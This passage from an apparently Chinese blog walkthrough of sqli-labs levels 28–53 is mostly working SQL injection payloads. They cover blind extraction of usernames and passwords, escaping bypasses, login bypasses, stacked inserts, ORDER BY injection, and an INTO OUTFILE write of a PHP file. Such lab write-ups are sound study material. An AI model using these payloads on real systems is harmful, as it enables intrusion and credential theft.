<span class="hljs-string">?id=1&#x27;</span>)<span class="hljs-keyword">and</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">SeLect</span>(column_name)<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())<span class="hljs-keyword">and</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)<span class="hljs-keyword">and</span>(ordinal_position=<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">105</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span>(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span>
<span class="hljs-string">用户名</span>
<span class="hljs-string">?id=1&#x27;</span>)<span class="hljs-keyword">and</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>((<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">SeLect</span>(username)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)<span class="hljs-keyword">where</span>(<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">68</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span>(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span>
<span class="hljs-string">密码</span>
<span class="hljs-string">?id=1&#x27;</span>)<span class="hljs-keyword">and</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>((<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">SeLect</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)<span class="hljs-keyword">where</span>(<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">68</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span>(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span></code></pre>



<h3 id="Less28a：GET-盲注-过滤union和select-带括号的单引号"><a href="#Less28a：GET-盲注-过滤union和select-带括号的单引号" class="headerlink" title="Less28a：GET-盲注-过滤union和select(带括号的单引号)"></a>Less28a：GET-盲注-过滤union和select(带括号的单引号)</h3><p>解法和上一关一样~。</p>
<h3 id="Less29：GET基于报错-不匹配-有waf"><a href="#Less29：GET基于报错-不匹配-有waf" class="headerlink" title="Less29：GET基于报错-??不匹配-有waf"></a>Less29：GET基于报错-??不匹配-有waf</h3><p>名字稀奇古怪的，应该是作者鹰钩利息不大好的亚子，，，</p>
<p>确定有waf？？？经实验只是吃掉了<code>#</code>，后面就按照前一个系列的慢慢来爆信息吧</p>
<h3 id="Less30：GET盲注-不匹配-有waf"><a href="#Less30：GET盲注-不匹配-有waf" class="headerlink" title="Less30：GET盲注-??不匹配-有waf"></a>Less30：GET盲注-??不匹配-有waf</h3><p>经实验只是在上一关的基础上减少了报错，并且闭合是双引号。说是盲注，算是吧。。。剩下的和上一关也一样。</p>
<p>有点怀疑自己是不是哪里错了？？？</p>
<h3 id="Less31：GET盲注-不匹配-有waf"><a href="#Less31：GET盲注-不匹配-有waf" class="headerlink" title="Less31：GET盲注-??不匹配-有waf"></a>Less31：GET盲注-??不匹配-有waf</h3><p>这一关是<code>&quot;)</code>闭合，且过滤了<code>#</code>，但是有一个问题，如果环境是php+apache，不会发现问题，JSP+tomcat会发现以<code>id=-1</code>强制报错时不会得出结果，原因就在文章开头讲的http参数污染。其他都一样。</p>
<h3 id="Less32：GET-bypass自定义过滤和转义"><a href="#Less32：GET-bypass自定义过滤和转义" class="headerlink" title="Less32：GET-bypass自定义过滤和转义"></a>Less32：GET-bypass自定义过滤和转义</h3><p>观察有转义和16进制编码，那么猜测这一关就是编码注入了</p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210221172214978.png" srcset="/img/loading.gif" alt="image-20210221172214978"></p>
<p>试试宽字节注入<code>?id=-1%df%27%20union%20select%201,database(),3%23</code>成功！</p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210221173335731.png" srcset="/img/loading.gif" alt="image-20210221173335731"></p>
<h3 id="Less33：GET-bypass转义符"><a href="#Less33：GET-bypass转义符" class="headerlink" title="Less33：GET-bypass转义符"></a>Less33：GET-bypass转义符</h3><p>这一关上一关的payload也可以用🤣</p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210221173518057.png" srcset="/img/loading.gif" alt="image-20210221173518057"></p>
<p>看一下这关的源码，使用了<code>addslashes()</code>函数进行转义特殊字符，但是依旧可以使用编码绕过。</p>
<h3 id="Less34：POST-bypass转义符"><a href="#Less34：POST-bypass转义符" class="headerlink" title="Less34：POST-bypass转义符"></a>Less34：POST-bypass转义符</h3><p>本关只是addslashes过滤，所以只对特殊符号有影响，所以本小节只介绍两种不曾遇到的方式。</p>
<p>本节参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/105896415">https://blog.csdn.net/weixin_39934520/article/details/105896415</a></p>
<p>这一关采用POST提交数据，与GET区别是：get是以 url 形式 提交的，因此数据会通过 URLencode，此处作何解?</p>
<p>关于Unicode的拓展学习可以参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fnlingnzb-learner/p/6163205.html">Unicode令人混淆的概念</a></p>
<h4 id="1-宽字节注入"><a href="#1-宽字节注入" class="headerlink" title="1.宽字节注入"></a>1.宽字节注入</h4><p>宽字节注入和 GET 中并无差别，使用<code>%bb%27</code>或<code>%bb%5c%5c%27</code>代替<code>&#39;</code>均可，在这里同样可以平级越权</p>
<blockquote>
<pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=%bb&#x27; or <span class="hljs-number">1</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>#&amp;passwd=<span class="hljs-number">1</span></code></pre>
</blockquote>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210221193343896.png" srcset="/img/loading.gif" alt="image-20210221193343896"></p>
<p>但是使用hackbar无法成功，原因是%经过url编码为%25，又生了一次变异，所以无法成功</p>
<h4 id="2-编码转换注入"><a href="#2-编码转换注入" class="headerlink" title="2.编码转换注入"></a>2.编码转换注入</h4><p>将 UTF-8 的<code>&#39;</code>转换为 UTF-16 的<code>�&#39;</code>实现注入</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=�&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#&amp;passwd=1</code></pre>

<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210221224901414.png" srcset="/img/loading.gif" alt="image-20210221224901414"></p>
<h3 id="Less35：GET-bypass转义数字型"><a href="#Less35：GET-bypass转义数字型" class="headerlink" title="Less35：GET-bypass转义数字型"></a>Less35：GET-bypass转义数字型</h3><p>经实验，注释符只有<code>-- senull</code>有效，其他什么都没变，过滤函数是addslashes()，而且没有闭合，直接写语句再注释就可以了</p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210221235949699.png" srcset="/img/loading.gif" alt="image-20210221235949699"></p>
<h3 id="Less36：GET-bypass-mysql-real-escape-string"><a href="#Less36：GET-bypass-mysql-real-escape-string" class="headerlink" title="Less36：GET-bypass mysql_real_escape_string"></a>Less36：GET-bypass mysql_real_escape_string</h3><p>关于<code>mysql_real_escape_string</code>上面的二次注入讲到过，会转义特殊符号(\x00.\n,\r,,“,\x1a)，和过滤<code>#</code>，所以注释只能用<code>-- senull</code>(哭，别人都只是过滤单引号。。。)</p>
<p>对于此函数，若mysql没有设置GBK，还是可以突破的</p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222002858692.png" srcset="/img/loading.gif" alt="image-20210222002858692"></p>
<h3 id="Less37：POST-bypass-mysql-real-escape-string"><a href="#Less37：POST-bypass-mysql-real-escape-string" class="headerlink" title="Less37：POST-bypass mysql_real_escape_string"></a>Less37：POST-bypass mysql_real_escape_string</h3><p>老规矩，碰到登录框试试万能密码，可以成功    </p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222003622420.png" srcset="/img/loading.gif" alt="image-20210222003622420"></p>
<p>爆数据库可以走通</p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222003533575.png" srcset="/img/loading.gif" alt="image-20210222003533575"></p>
<p>说来也奇怪，以下payload只能burp抓包修改才能成功，浏览器直接做会失败，显示<code>�</code>被转义为<code>�\&#39;</code>,按理说这个没有<code>%</code>啊？？？</p>
<pre><code class="hljs sql">表
-admin�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-comment">--+</span>
字段
uname=-<span class="hljs-keyword">admin</span>%E3<span class="hljs-string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+&amp;passwd=admin&amp;submit=Submit</span>
<span class="hljs-string">用户名和密码</span>
<span class="hljs-string">uname=-admin%E3&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-comment">--+&amp;passwd=admin&amp;submit=Submit</span></code></pre>



<h3 id="Less38：GET-堆叠注入字符型-单引号"><a href="#Less38：GET-堆叠注入字符型-单引号" class="headerlink" title="Less38：GET-堆叠注入字符型(单引号)"></a>Less38：GET-堆叠注入字符型(单引号)</h3><p>这一关比较简单，例如插入数据库一个消息</p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222010314740.png" srcset="/img/loading.gif" alt="image-20210222010314740"></p>
<h3 id="Less39：GET-堆叠注入数字型"><a href="#Less39：GET-堆叠注入数字型" class="headerlink" title="Less39：GET-堆叠注入数字型"></a>Less39：GET-堆叠注入数字型</h3><p>和上一关一样，只不过是数字型，没有闭合。</p>
<h3 id="Less40：GET-盲注-堆叠-字符型-bool-单引号-小括号"><a href="#Less40：GET-盲注-堆叠-字符型-bool-单引号-小括号" class="headerlink" title="Less40：GET-盲注-堆叠-字符型(bool 单引号 小括号)"></a>Less40：GET-盲注-堆叠-字符型(bool 单引号 小括号)</h3><p>这一关有点小毛病，我也不知道哪里出问题了</p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222013912933.png" srcset="/img/loading.gif" alt="image-20210222013912933"><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222013935083.png" srcset="/img/loading.gif" alt="image-20210222013935083"></p>
<p>啊这。。但是用双引号闭合进行堆叠注入的时候注入不了，单引号又ok？？？</p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222014215664.png" srcset="/img/loading.gif" alt="image-20210222014147624"><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222014257803.png" srcset="/img/loading.gif" alt="image-20210222014257803"></p>
<h3 id="Less41：GET-数字型盲注-堆叠"><a href="#Less41：GET-数字型盲注-堆叠" class="headerlink" title="Less41：GET-数字型盲注-堆叠"></a>Less41：GET-数字型盲注-堆叠</h3><p>这一关和39一样的，只不过没有报错，是盲注</p>
<h3 id="Less42：POST-基于报错的堆叠注入字符型"><a href="#Less42：POST-基于报错的堆叠注入字符型" class="headerlink" title="Less42：POST-基于报错的堆叠注入字符型"></a>Less42：POST-基于报错的堆叠注入字符型</h3><p>嘿嘿，这一关注册和更改密码都没法用，只能在登录界面搞事情。</p>
<p>通过试错，发现语句大概是：<code>SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;</code>,这就好办了，直接在密码后面加新插入信息的语句就可了，其实后面有没有语句都无所谓，注释了就🆗了</p>
<p>payload：<code>mima&#39;;insert into users values(42,&#39;Less42&#39;,&#39;Less42&#39;)#</code></p>
<p><strong>注意：输入框中不要用–+是因为+不会进行url编码，因为他不在url地址栏中，可以使用 # %23 – #</strong></p>
<h3 id="Less43：POST-基于报错的堆叠注入字符型-带括号"><a href="#Less43：POST-基于报错的堆叠注入字符型-带括号" class="headerlink" title="Less43：POST-基于报错的堆叠注入字符型(带括号)"></a>Less43：POST-基于报错的堆叠注入字符型(带括号)</h3><p>搞注入的地方和上一关一样啊，，，</p>
<p>试了半天的错被怼了半天。。。最后发现要在密码框进行试错，，，</p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222023102002.png" srcset="/img/loading.gif" alt="image-20210222023102002"></p>
<p>闭合为<code>&#39;)</code></p>
<p>剩下的和前一贯一样了</p>
<h3 id="Less44：POST-基于报错-盲注-堆叠注入字符型"><a href="#Less44：POST-基于报错-盲注-堆叠注入字符型" class="headerlink" title="Less44：POST-基于报错-盲注-堆叠注入字符型"></a>Less44：POST-基于报错-盲注-堆叠注入字符型</h3><p>老地方，，，，不过换个方式，试试万能密码：<code>1&#39; or 1=1#</code>，成了！</p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222024937343.png" srcset="/img/loading.gif" alt="image-20210222024937343"></p>
<p>哈哈，不过在登录界面就可以堆叠注入了</p>
<p>payload：<code>1&#39;;insert into users values (&#39;44&#39;,&#39;less44&#39;,&#39;less44&#39;)#</code></p>
<h3 id="Less45：POST-基于报错字符型-盲注-堆叠注入"><a href="#Less45：POST-基于报错字符型-盲注-堆叠注入" class="headerlink" title="Less45：POST-基于报错字符型-盲注-堆叠注入"></a>Less45：POST-基于报错字符型-盲注-堆叠注入</h3><p>45 关与 43 关一样</p>
<pre><code class="hljs sql">1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">45</span>,<span class="hljs-string">&#x27;Less45&#x27;</span>,<span class="hljs-string">&#x27;Less45&#x27;</span>)<span class="hljs-comment">#</span></code></pre>



<h3 id="Less46：GET-基于报错-数字型-排序注入"><a href="#Less46：GET-基于报错-数字型-排序注入" class="headerlink" title="Less46：GET-基于报错-数字型-排序注入"></a>Less46：GET-基于报错-数字型-排序注入</h3><p>这一关参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/106167470%EF%BC%8C%E6%94%B6%E8%8E%B7%E6%BB%A1%E6%BB%A1%EF%BC%81">https://blog.csdn.net/weixin_39934520/article/details/106167470，收获满满！</a></p>
<p>可以发现输入sort的值不一样，排序结果就不一样，那么猜测后台肯定用到该参数进行排序！那么后台语句应该是：<code>select * from users order by $sort</code></p>
<p>这就好办了</p>
<h4 id="1-sort-select"><a href="#1-sort-select" class="headerlink" title="1.?sort=(select **)"></a>1.?sort=(select <strong>**</strong>)</h4><p>也算是结合报错注入</p>
<pre><code class="hljs sql">数据库
?sort=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)
表
?<span class="hljs-keyword">sort</span>=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)
字段
?<span class="hljs-keyword">sort</span>=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)
数据
?<span class="hljs-keyword">sort</span>=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)

在《注入天书》中还见到了派生表的另一种写法：
?<span class="hljs-keyword">sort</span>=(<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>)))

updatexml的例子
?<span class="hljs-keyword">sort</span>=UpdateXml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)

延时注入
?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">mid</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>),<span class="hljs-number">0</span>) 
?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">mid</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>))

布尔盲注
因为<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>接返回数字或布尔值（因为是弱类型，布尔值返回仍是数字）的语句是没有作用的，我们只能用第三句式的<span class="hljs-keyword">rand</span>()函数，通过观察<span class="hljs-keyword">ID</span>顺序的不同，即可判断<span class="hljs-literal">true</span>页面和<span class="hljs-literal">false</span>页面。
<span class="hljs-literal">true</span>:?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">left</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>)
fslse:?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">left</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>))=<span class="hljs-number">116</span>)

利用 <span class="hljs-keyword">procedure</span> analyse 参数，我们可以执行报错注入。
?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(<span class="hljs-keyword">rand</span>(),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">version</span>())),<span class="hljs-number">1</span>)

导出文件 <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> 参数注入：
?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;C:\\phpStudy\\WWW\\sqli\\Less-46\\test.txt&quot;</span></code></pre>

<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210222031730681.png" srcset="/img/loading.gif" alt="image-20210222031730681"></p>
<h3 id="Less47：GET-基于报错-字符型-排序注入-单引号"><a href="#Less47：GET-基于报错-字符型-排序注入-单引号" class="headerlink" title="Less47：GET-基于报错-字符型-排序注入(单引号)"></a>Less47：GET-基于报错-字符型-排序注入(单引号)</h3><p>和46差不多，只是闭合不一样</p>
<pre><code class="hljs sql">基于报错注入
?sort=1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)<span class="hljs-comment">--+</span>
?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+</span>
<span class="hljs-string"></span>
<span class="hljs-string"> Time 盲注</span>
<span class="hljs-string"> ?sort=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">mid</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0.3</span>))<span class="hljs-comment">--+</span>

<span class="hljs-keyword">procedure</span> analyse 参数后注


<span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> 参数注入
?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; into outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-47\\test.txt&quot; --+</span>
<span class="hljs-string">?sort=1&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;C:\\phpStudy\\WWW\\sqli\\Less-47\\test.php&quot;</span> <span class="hljs-keyword">lines</span> <span class="hljs-keyword">terminated</span> <span class="hljs-keyword">by</span> <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e2020</span><span class="hljs-comment">--+</span></code></pre>



<h3 id="Less48：GET-基于报错-盲注-数字型排序注入"><a href="#Less48：GET-基于报错-盲注-数字型排序注入" class="headerlink" title="Less48：GET-基于报错-盲注-数字型排序注入"></a>Less48：GET-基于报错-盲注-数字型排序注入</h3><p>本关与 less-46 的区别在于报错注入不能使用，不进行错误回显，因此其他的方法我们依旧是可以使用的。</p>
<pre><code class="hljs sql">Bool 盲注
?sort=rand((ascii(mid((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))&gt;<span class="hljs-number">65</span>)

<span class="hljs-built_in">Time</span> 盲注
?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">mid</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0.1</span>))

<span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> 参数注入
?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;C:\\phpStudy\\WWW\\sqli\\Less-46\\test.txt&quot;</span></code></pre>



<h3 id="Less49：GET-基于报错-盲注-字符型排序注入"><a href="#Less49：GET-基于报错-盲注-字符型排序注入" class="headerlink" title="Less49：GET-基于报错-盲注-字符型排序注入"></a>Less49：GET-基于报错-盲注-字符型排序注入</h3><p> 本关与 47 关基本类似，区别在于没有错误回显，所以我们可以通过延时注入和导入文件进 行注入</p>
<pre><code class="hljs sql">Time 盲注
?sort=1&#x27; and if(ascii(mid(database(),1,1))=115,1,sleep(1))<span class="hljs-comment">--+</span>

into outfile 参数注入
?sort=1&#x27; into outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-47\\test.txt&quot; <span class="hljs-comment">--+</span></code></pre>



<h3 id="Less50：GET-基于报错-数字型-排序堆叠注入"><a href="#Less50：GET-基于报错-数字型-排序堆叠注入" class="headerlink" title="Less50：GET-基于报错-数字型-排序堆叠注入"></a>Less50：GET-基于报错-数字型-排序堆叠注入</h3><p>执行 sql 语句我们这里使用的是 mysqli_multi_query()函数，而之前我们使用的是 mysqli _query()，区别在于 mysqli_multi_query()可以执行多个 sql 语句，而 mysqli_query()只能执行 一个 sql 语句，那么我们此处就可以执行多个 sql 语句进行注入，也就是我们之前提到的 sta tcked injection。</p>
<pre><code class="hljs sql">?sort=1;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">50</span>,<span class="hljs-string">&#x27;Less50&#x27;</span>,<span class="hljs-string">&#x27;Less50&#x27;</span>)<span class="hljs-comment">--+</span></code></pre>



<h3 id="Less51：GET-基于报错-字符型-排序堆叠注入"><a href="#Less51：GET-基于报错-字符型-排序堆叠注入" class="headerlink" title="Less51：GET-基于报错-字符型-排序堆叠注入"></a>Less51：GET-基于报错-字符型-排序堆叠注入</h3><p> 和Less-50的一样，但是注意单引号的闭合和注释符。</p>
<pre><code class="hljs sql">?sort=1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)<span class="hljs-comment">--+</span></code></pre>



<h3 id="Less52：GET-bool盲注-数字型-排序堆叠注入"><a href="#Less52：GET-bool盲注-数字型-排序堆叠注入" class="headerlink" title="Less52：GET-bool盲注-数字型-排序堆叠注入"></a>Less52：GET-bool盲注-数字型-排序堆叠注入</h3><p> 布尔盲注，延时注入都可以参考Less-46</p>
<pre><code class="hljs sql">堆叠注入
?sort=1;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">52</span>,<span class="hljs-string">&#x27;Less52&#x27;</span>,<span class="hljs-string">&#x27;Less52&#x27;</span>)<span class="hljs-comment">--+</span></code></pre>



<h3 id="Less53：GET-盲注-字符型-排序堆叠注入"><a href="#Less53：GET-盲注-字符型-排序堆叠注入" class="headerlink" title="Less53：GET-盲注-字符型-排序堆叠注入"></a>Less53：GET-盲注-字符型-排序堆叠注入</h3><p>和上一关一样</p>
<pre><code class="hljs sql">堆叠注入
